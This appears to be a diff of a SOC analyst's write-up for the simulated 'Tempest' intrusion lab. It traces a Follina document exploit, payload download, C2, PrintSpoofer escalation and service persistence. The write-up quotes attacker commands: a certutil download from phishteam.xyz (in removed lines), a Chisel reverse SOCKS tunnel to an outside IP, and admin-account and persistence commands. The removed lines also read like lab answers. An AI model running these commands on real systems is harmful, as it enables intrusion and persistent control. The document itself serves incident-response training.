@@ -1,116 +1,175 @@
 # Tempest Incident Investigation
 
-## Task 1 – Introduction
-
-Brief explanation of the investigation.
-
----
-
-## Task 2 – Preparation: Log Analysis
-
-Describe the files analyzed:
-- capture.pcapng
-- sysmon.evtx
-- windows.evtx
+This investigation analyzes a simulated compromise of a Windows workstation.
+The attacker gained access through a **malicious document**, established **command and control**, escalated privileges, and created **persistence mechanisms**.
 
 ---
 
-## Task 3 – Preparation: Tools and Artifacts
+# Incident Overview
 
-Tools used:
+Attack Chain:
 
-- Wireshark
-- Event Viewer
-- PowerShell
-- VirusTotal
+1. Phishing document downloaded
+2. Word document executes exploit
+3. Payload downloaded from attacker infrastructure
+4. Command & Control communication established
+5. Reverse proxy established
+6. Privilege escalation via PrintSpoofer
+7. New administrator account created
+8. Persistence established via Windows service
 
 ---
 
-## Task 4 – Initial Access – Malicious Document
+# Initial Access – Malicious Document
 
-Malicious file discovered:
+The victim downloaded a malicious Word document from the phishing server.
 
+![Malicious Document Download](Screenshots/10_http_traffic_phishteam_xyz.png)
+
+The file retrieved:
+
+```
 free_magicules.doc
+```
 
-User:
+Host involved:
 
-TEMPEST\benimaru
-
-Application used:
-
-Microsoft Word
-
-Exploit triggered:
-
-CVE-2022-30190 (Follina)
-
----
-
-## Task 5 – Initial Access – Stage 2 Execution
-
-Payload downloaded with:
-
-certutil -urlcache -split -f http://phishteam.xyz/02dcf07/first.exe
-
-Downloaded file:
-
-first.exe
-
----
-
-## Task 6 – Initial Access – Malicious Document Traffic
-
-Suspicious traffic observed to:
-
-167.71.199.191
-
-Domain:
-
+```
 phishteam.xyz
+```
 
 ---
 
-## Task 7 – Discovery – Internal Reconnaissance
+# Exploit Execution
+
+The malicious document triggered execution of:
+
+```
+msdt.exe
+```
+
+This is associated with the **Follina vulnerability**.
+
+![MSDT Execution](Screenshots/09_msdt_follina_exploit.png)
+
+---
+
+# Payload Download
+
+The exploit downloaded a second stage payload using PowerShell.
+
+![Payload Download](Screenshots/09_certutil_download_first_exe.png)
+
+Payload retrieved:
+
+```
+first.exe
+```
+
+---
+
+# Command and Control
+
+Network analysis revealed outbound traffic to:
+
+```
+167.71.199.191
+```
+
+![C2 Traffic](Screenshots/06_c2_ip_167.71.199.191.png)
+
+---
+
+# Reverse Proxy Tool
+
+The attacker executed **Chisel**, a tool used to create a reverse SOCKS proxy.
+
+![Chisel Command](Screenshots/20_chisel_reverse_socks_command.png)
 
 Command executed:
 
-netstat -ano -p tcp
-
-Suspicious listening port discovered:
-
-5985
-
-This port corresponds to **Windows Remote Management (WinRM)**.
+```
+ch.exe client 167.71.199.191:8080 R:socks
+```
 
 ---
 
-## Task 8 – Privilege Escalation – Exploiting Privileges
+# Privilege Escalation
 
-Privilege identified:
+Privilege escalation was performed using **PrintSpoofer**, exploiting the `SeImpersonatePrivilege`.
 
-SeImpersonatePrivilege
-
-Tool used:
-
-PrintSpoofer
-
-Hash:
-
-8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d
+![PrintSpoofer Execution](Screenshots/25_printspoofer_sha256_hash.png)
 
 ---
 
-## Task 9 – Actions on Objective – Fully Owned Machine
+# Account Creation
 
-New users created:
+The attacker created a new user account:
 
-shuna  
+```
 shion
+```
 
-User added to administrators group:
+![Account Creation](Screenshots/28_new_user_account_creation.png)
 
-net1 localgroup administrators /add shion
+Windows Event ID confirming creation:
 
-Persistence established using:
+```
+4720
+```
 
-sc.exe create TempestUpdate2
+---
+
+# Privilege Assignment
+
+The attacker added the account to the **Administrators group**.
+
+![Admin Group Addition](Screenshots/29_admin_group_addition.png)
+
+---
+
+# Persistence
+
+Persistence was established by creating a Windows service.
+
+![Service Persistence](Screenshots/30_persistence_service_creation.png)
+
+Command executed:
+
+```
+sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
+```
+
+This ensures the malware runs **every time the system boots**.
+
+---
+
+# MITRE ATT&CK Techniques
+
+| Technique | Description                     |
+| --------- | ------------------------------- |
+| T1566     | Phishing                        |
+| T1204     | User Execution                  |
+| T1059     | Command Execution               |
+| T1105     | Ingress Tool Transfer           |
+| T1572     | Protocol Tunneling              |
+| T1134     | Access Token Manipulation       |
+| T1543     | Create or Modify System Process |
+| T1078     | Valid Accounts                  |
+
+---
+
+# Conclusion
+
+The attacker successfully:
+
+* Delivered a malicious document
+* Exploited the Follina vulnerability
+* Downloaded malware payloads
+* Established command and control
+* Escalated privileges using PrintSpoofer
+* Created an administrator account
+* Installed persistence via a Windows service
+
+This investigation demonstrates the workflow used by SOC analysts to identify attacker activity across **network traffic, endpoint logs, and system artifacts**.
+
